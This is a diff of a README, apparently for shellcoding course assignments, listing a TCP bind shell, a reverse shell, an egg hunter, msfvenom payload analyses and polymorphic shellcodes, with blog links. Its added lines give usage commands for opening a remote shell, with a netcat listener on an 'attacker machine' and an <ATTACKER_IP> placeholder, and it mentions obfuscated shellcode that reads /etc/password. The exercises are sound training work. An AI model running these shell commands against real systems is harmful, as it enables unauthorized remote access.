@@ -5,8 +5,8 @@ Create a Shell Bind TCP Shellcode
 - Execs shell on incoming connection
 - Port number should be easily configurable
 ```
-Implemeted the bind shell shellcode 
-Usage :
+Implemeted the TCP Bind Shell shellcode 
+Usage example: ./bind_shell <PORT>
 
 In Victim Machine => ./bindshell 9999 
 
@@ -18,8 +18,17 @@ Blog : https://oxhat.blogspot.com/2018/04/coding-custom-tcp-bind-shell-shellcode
 Create a Shell Reverse Tcp Shellcode
 - Reverse connect to configured IP and Port
 - Execs shell on incoming connection
-IP and Port should be easily configurable
+- IP and Port should be easily configurable
+```
+Implemeted the TCP Reverse Shell shellcode 
+Usage example : ./reverse_shell <ATTACKER_IP> <PORT>
 
+Attacker Machine => nc -nlvp 8888
+
+In Victim Machine => ./reverse_shell 127.0.0.1 8888  
+
+Blog : https://oxhat.blogspot.com/2018/04/coding-custom-tcp-reverse-shell.html
+```
 ### Assignment 3
 Study about Egg Hunter Shellcode
 Create a working demo of the Egg Hunter
@@ -37,7 +46,9 @@ Present your analysis
 As msfpayload is outdate, all the payloads are created using msfvenom
 
 1. Analysis of linux/x86/adduser shellcode
+
 2. Analysis of linux/x86/chmod shellcode
+
 3. Analysis of linux/x86/exec shellcode
 
 Blog : https://oxhat.blogspot.com/2019/04/analyzing-shellcode.html
@@ -48,7 +59,9 @@ Take upto 3 shellcode from shell-storm and create a polymorphic versions of them
 - Bonus point for making it shorter in length than original
 ```
 1. Implemented 2 polmorphic versions of exit() shellcode 
+
 2. Implmented polymorphic version of cat /etc/password shellcode
+
 3. Implemented a polymorphic and obfuscated version of commandline netcat 
 
 Blog : https://oxhat.blogspot.com/2019/04/polymorphic-shellcodes.html
